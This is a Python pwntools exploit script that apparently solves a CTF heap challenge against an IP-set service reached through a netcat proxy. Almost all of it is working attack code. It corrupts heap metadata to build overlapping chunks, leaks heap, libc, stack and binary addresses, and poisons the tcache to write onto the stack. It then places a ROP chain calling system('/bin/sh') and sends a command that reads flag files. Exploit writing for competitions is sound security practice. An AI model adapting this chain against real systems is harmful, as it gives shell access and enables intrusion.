import struct

from pwn import *

# import symsolve

context.terminal = ['tilix', '--action=session-add-right', '-e']

exe = './pwn.patched'


def bruteforce(arg):

    def bits_to_bytearray(bits):
        if len(bits) % 8 != 0:
            raise ValueError("Number of bits must be a multiple of 8")
    
        bytes_list = []
        for i in range(0, len(bits), 8):
            byte = 0
            for bit in reversed(bits[i:i+8]):
                byte = (byte << 1) | bit
            bytes_list.append(byte)
    
        return bytearray(bytes_list)
    
    def bytearray_to_bits(bs):
        bits = []
        for byte in bs:
            for i in range(8):
                bits.append((byte >> i) & 1)
        return bits
    
    if args.REMOTE:
        o_libc_leak = 0x21ace0
        o_exit_funcs = 0x21bf00
        o_ld_ptr = 0x21b870
        o_ld_leak = 0x3a040
        o_fini = 0x6040
        o_system = 0x50d70
        #io = remote('127.0.0.1', 4343)
        io = process('nc -X connect -x instance.penguin.0ops.sjtu.cn:18081 bey8pqqghfkbjwf8 1', shell=True)

        # io = process('nc -X connect -x instance.penguin.0ops.sjtu.cn:18081 pkpqcyfc24ryj2hg 1', shell=True)
    else:
        o_libc_leak = 0x21ace0
        o_exit_funcs = 0x21bf00
        o_ld_ptr = 0x21b870
        o_ld_leak = 0x3a040
        o_fini = 0x6040
        o_system = 0x50d70
    
    
        #o_libc_leak = 0x211b20
        #o_exit_funcs = 0x212fc0
        #o_ld_ptr = 0x2126b0
        #o_ld_leak = 0x3a000
        #o_fini = 0x4440
        #o_system = 0x5af30
    
        if args.QIRA:
            io = remote('localhost', 4000)
        else:
            if args.GDB:
                io = gdb.debug(exe, """
    source /home/korniltsev/pwndbg/gdbinit.py
    continue
                """)
            else:
                io = process(exe)
    
    
    def create_ip_set(v1, v2):
        #print(f'create_ip_set({v1}, {v2})')
        io.recvuntil(b'Choose an option: ')
        io.sendline(b'1')
        io.recvuntil(b'Please input start ip:')
        io.sendline(v1)
        io.recvuntil(b'Please input end ip:')
        io.sendline(v2)
        output = io.recvuntil(b'Create IP Set Success!')
        #print(f'>> {output.decode()}')
    
    def query_ip(v):
        # io.recvuntil(b'Choose an option: ')
        io.sendline(b'4')
        io.recvuntil(b'Please input ip:')
        io.sendline(v)
        io.recvuntil(b'IP is ')
        res = io.recvline()
        notinset = b"not in the set" in res
        return not notinset
    
    
    
    
    def delete_ip_set():
        #io.recvuntil(b'Choose an option: ')
        io.sendline(b'5')
        out = io.recvuntil(b'Delete IP Set Success!')
        #print(f'>> {out.decode()}')
    
    def add_ip(v):
        # print(f'add_ip({v})')
        # io.recvuntil(b'Choose an option: ')
        io.sendline(b'2')
        io.recvuntil(b'Please input ip:')
        io.sendline(v)
        io.recvuntil(b'Edit IP Set Success!')
    
    def delete_ip(v):
        # print(f'delete_ip({v})')
        # io.recvuntil(b'Choose an option: ')
        io.sendline(b'3')
        io.recvuntil(b'Please input ip:')
        io.sendline(v)
        io.recvuntil(b'Edit IP Set Success!')
    
    
    def ip(i):
        return f'{i >> 24}.{(i >> 16) & 0xff}.{(i >> 8) & 0xff}.{i & 0xff}'.encode()
    
    
    def malloc(size):
        create_ip_set(ip(0), ip((size-1)<<3))
        return size
    
    def free():
        delete_ip_set()
    
    
    
    malloc(0x18) # c1
    free()
    
    malloc(0x28) # c2
    free()
    
    hardcode = True # faster
    if not hardcode:
        set_start, set_end, ip1, mask = symsolve.symbolic_solve_ips(0x38, -703)
        create_ip_set(ip(set_start), ip(set_end))
        add_ip(ip(ip1) + b'/' + str(mask).encode())
    else:
        # WIN alloc size: 0x38 set: 0x6bf-0x87a ip+mask: 0x7ff/22 - taken from symsolve output
        create_ip_set(ip(0x6bf), ip(0x87a)) # c3
        add_ip(ip(0x7ff) + b'/22') # corrupt with 11111-s
    
    malloc(0x78) # c4__ , the size is big because for small values angr did not find a solution
    free() # we will reallocate here a bit later
    
    malloc(0x38) # cleak
    free()
    
    if not hardcode:
        set_start, set_end, ip1, mask = symsolve.symbolic_solve_ips(0x78, -1214)
        create_ip_set(ip(set_start), ip(set_end))
        delete_ip(ip(ip1) + b'/' + str(mask).encode())
    else:
        # WIN alloc size: 0x78 set: 0xa02004be-0xa0200878 ip+mask: 0xa02007c8/21 - taken from symsolve output
        create_ip_set(ip(0xa02004be), ip(0xa0200878)) # c4
        delete_ip(ip(0xa02007c8) + b'/21') # corrupt with 0000s
    
    malloc(0x18) # c5
    free()
    
    overlapsz = 0x220-8
    malloc(overlapsz) # c1 overlaping all other allocs
    
    def read_byte_offset(start, end):
        print(f'reading {start} {end} len= {end-start}')
        start *= 8
        end *= 8
        bits = []
    
        for i in range(start, end):
            bit = query_ip(ip(i))
            if bit:
                bits.append(1)
            else:
                bits.append(0)
        return bits_to_bytearray(bits)
    
    def write_byte_array(start, bs):
        print(f'writing {start} {len(bs)}')
        start *=8
        bits = bytearray_to_bits(bs)
        for i, bit in enumerate(bits):
            if bit:
                add_ip(ip(start + i))
            else:
                delete_ip(ip(start + i))
    
    def debug_dump():
        bs = read_byte_offset(0, 0x200)
        print(hexdump(bs))
    
    leaks = read_byte_offset(0x00000110, 0x00000120)
    print(hexdump(leaks))
    heap, tcachekey = struct.unpack('QQ', leaks)
    heap <<= 12
    
    
    
    bigchunk_address = heap + (0x5555555593f0-0x555555559000) # TODO
    
    # we have overlapping chunk. now we craft a libc leak
    free()
    malloc(1040) # bigchunk
    malloc(0x48)
    
    malloc(overlapsz)
    
    
    # change the size of the chunk to 0x31 from 0x41, so that we have tcache counts=2 allowing linked list
    write_byte_array(0x00000108, struct.pack("Q", 0x31))
    free()
    
    malloc(0x38)
    free()
    
    malloc(overlapsz)
    write_byte_array(0x00000110, struct.pack("Q", (heap>>12) ^ bigchunk_address))
    free()
    
    malloc(0x28)
    malloc(0x28) # free the big chunk
    free()
    
    malloc(overlapsz)
    libc_leak = read_byte_offset(0x150, 0x158)
    libc_leak = struct.unpack('Q', libc_leak)[0]
    print('found libc leak', hex(libc_leak))
    libc_base = libc_leak - o_libc_leak
    print(hex(libc_leak))
    print(f' libc base {hex(libc_base)}')
    
    ############### realloc 1
    
    #print('tcache1')
    free()
    malloc(0x28)
    free()
    malloc(0x18)
    free()
    
    malloc(overlapsz)
    
    write_byte_array(0x178, struct.pack("Q", 0x31))
    
    
    free()
    malloc(0x18)
    free()
    
    ptr_to_libc_stack_argv = libc_base + 0x21ba10
    
    
    realloc1_addr = ptr_to_libc_stack_argv
    print('reallocing into {realloc1_addr}')
    malloc(overlapsz)
    write_byte_array(0x180, struct.pack("Q", (realloc1_addr)^(heap>>12)))
    free()
    malloc(0x28)
    malloc(0x28)
    
    
    reallocdata1 = read_byte_offset(0x10, 0x18)
    print(hexdump(reallocdata1))
    stackleak = struct.unpack("Q", reallocdata1)[0]
    print(f'stack {hex(stackleak)}')
    
    #stack           0x7ffcb1240248
    #[stack]         0x7ffcb12400e8 0x63fdda4a0b04
    stack_target = stackleak - (0x7ffcb1240248-0x7ffcb12400e8)
    
    print(f'stacktarget {hex(stack_target)}')
    
    
    ############################ realloc 2
    realloc_addr2 = stack_target - 0x18-0x10
    print(f'realloc_addr2 {hex(realloc_addr2)}')
    
    
    
    malloc(0x28)
    free()
    malloc(0x18)
    free()
    malloc(overlapsz)
    write_byte_array(0x198, struct.pack("Q", 0x3e1))
    write_byte_array(0x1c8, struct.pack("Q", 0x3e1))
    free()
    print("created 2 3e1 chunks");
    
    malloc(0x28)
    free()
    malloc(0x18)
    free()
    
    malloc(overlapsz)
    #debug_dump()
    
    write_byte_array(0x1d0, struct.pack("Q", realloc_addr2 ^ (heap>>12)))
    free()
    malloc(0x3e0-8)
    malloc(0x3e0-8)
    
    # allocated to stack
    
    exe_leak = read_byte_offset(0x28, 0x30)
    exe_leak = u64(exe_leak)
    print(f'exe leak {hex(exe_leak)}')
    exe_base = exe_leak - 0x1b1c # ret from query
    print(f'exe base {hex(exe_base)}')
    binsh = libc_base + 0x1d8678

    pl = b''
    pl += p64(libc_base + 0x3a889) # 0x3a889: add rsp, 0x18 ; ret ; (1 found)
    pl += p64(0xdead01);
    pl += p64(0xdead02);
    pl += p64(0xdead03);
    pl += p64(libc_base + 0x2a3e5) #: pop rdi ; ret ; (1 found)
    pl += p64(binsh)
    pl += p64(libc_base + o_system);
    write_byte_array(0x30, pl)
    
    #stackdata = read_byte_offset(0, 0x100)
    #print(hexdump(stackdata, begin=0))
    
    
    doadd, argstart, argend = arg;
    print(f'============== {arg} ========================')
    if doadd:
        add_ip(ip(0x28 * 8 + argstart) + b'-' + ip(0x28 * 8 + argend))
    else:
        delete_ip(ip(0x28 * 8 + argstart) + b'-' + ip(0x28 * 8 + argend))

    sleep(1);
    io.sendline('id;ls -ltr; cat *flag* *flg* /*flg')
    
    try:
        io.interactive()
    except:
        traceback.print_exc()
        print("ERRROR")

#for i in range(0, 12):
#    for j in range(i, 12):
#        for k in [True, False]:
#            bruteforce((k, i, j))


bruteforce((False, 0, 11))
